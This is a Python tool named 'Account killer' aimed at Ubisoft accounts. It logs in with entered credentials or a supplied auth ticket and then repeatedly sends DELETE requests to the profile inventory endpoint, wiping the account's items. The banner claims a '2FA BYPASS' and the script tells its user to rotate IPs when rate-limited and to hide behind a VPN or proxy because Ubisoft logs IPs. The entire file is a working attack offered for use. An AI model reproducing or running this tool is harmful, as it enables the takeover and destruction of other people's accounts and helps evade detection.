import colorama
import keyboard
import requests
import base64
import time
import os

from colorama import Fore, Back, Style

uplay_id = '0'

def get_authorization(login_info):
    global uplay_id
    encoded_login = str(base64.urlsafe_b64encode(login_info.encode('utf-8')))
    parse_econde = encoded_login[:-1]
    parse_econde = parse_econde.replace("b'", '', 1)
    headers = {
        'User-Agent' : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.59",
        'Ubi-AppId' : '314d4fef-e568-454a-ae06-43e3bece12a6',
        'Ubi-RequestedPlatformType' : 'uplay',
        'Authorization' : 'Basic ' + parse_econde,
        'Content-type' : 'application/json; charset=UTF-8',
    }
    json_body = {
        'rememberMe': True
    }
    print(Fore.WHITE + '[~] Generating auth id...')
    auth_response = requests.post('https://public-ubiservices.ubi.com/v3/profiles/sessions', headers=headers, json=json_body)
    if auth_response.status_code == 409:
        print(Fore.RED + '[-] Ratelimited\n')
        print('[~] Change IP and press any key to continue')
        input()
    if auth_response.status_code == 429:
        print(Fore.RED + '[-] Ratelimited\n')
        print('[~] Change IP and press any key to continue')
        input()
    if auth_response.status_code == 403:
        print(Fore.RED +  '[-] Locked account')
    if auth_response.status_code == 200:
        print(Fore.GREEN + '[+] Valid login, auth id generated')
        raw_response = str(auth_response.json())
        parsed_response = raw_response.replace("{'platformType': 'uplay', 'ticket': '", "")[::-1]
        parsed_list = parsed_response.split("t' ,'")[::-1]
        parsed_response = parsed_list[0][::-1]

        print(Fore.WHITE + '[~] Parsing UUID')
        uuid_list = raw_response.split('userId')
        uuid_list = uuid_list[1].split("', '")
        uplay_id = uuid_list[0].replace("': '", '')
        print(Fore.GREEN + '[+] Parsed UUID')
        return 'Ubi_v1 t=' + parsed_response

def request_delete(authorization):
    headers = {
        'User-Agent' : "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Edg/91.0.864.59",
        'Ubi-AppId' : '83564d31-7cd7-4bc0-a763-6524e78d1a7f',
        'Authorization' : authorization,
        'Ubi-LocaleCode' : 'en-us',
    }
    params = {
        'spaceId' : '5172a557-50b5-4665-b7db-e3f2e8c5041d'
    }
    print(Fore.GREEN + '[+] Ready')
    print(Fore.WHITE + '[~] UUID:', uplay_id)
    print(Fore.RED + '[!] Sending request')
    time.sleep(2.5)
    for x in range(0, 5):
        response = requests.delete('https://public-ubiservices.ubi.com/v1/profiles/{id}/inventory'.format(id=uplay_id), headers=headers, params=params)
        if response.    status_code != 200:
            print(Fore.RED + '[-] Error')
    if response.status_code == 200:
            print(Fore.GREEN + '[+] Done, relogin into upc')
    else:
        print(Fore.RED + '[-] Error, status code', response.status_code)

colorama.init()
os.system('cls')
os.system('title "Account killer | 2FA BYPASS SECURED, TAP IN!!! | New auto UUID filler! | Version 1.2"')
print(Fore.GREEN + '[~] Account killer tool by M3Talic#0015')
print(Fore.RED + '[!] Warning ubisoft will log IP, make sure to use a VPN or Proxy')
print(Fore.WHITE + '[1] Standard (2FA BYPASS)')
print(Fore.WHITE + '[2] Custom ticket')
choice = int(input())
os.system('cls')
if choice == 1:
    print(Fore.WHITE + '[~] Enter Email')
    login = input()
    print(Fore.WHITE + '[~] Enter Password')
    login = login + ':' + input()
    os.system('cls')
    print(Fore.WHITE + '[~] Please wait.')
    request_delete(get_authorization(login))
    input()
elif choice == 2:
    print(Fore.WHITE + '[~] Enter Auth ID')
    login = input()
    print(Fore.WHITE + '[~] Enter uplay ID')
    uplay_id = input()
    os.system('cls')
    print(Fore.WHITE + '[~] Please wait.')
    request_delete(login)
    input()
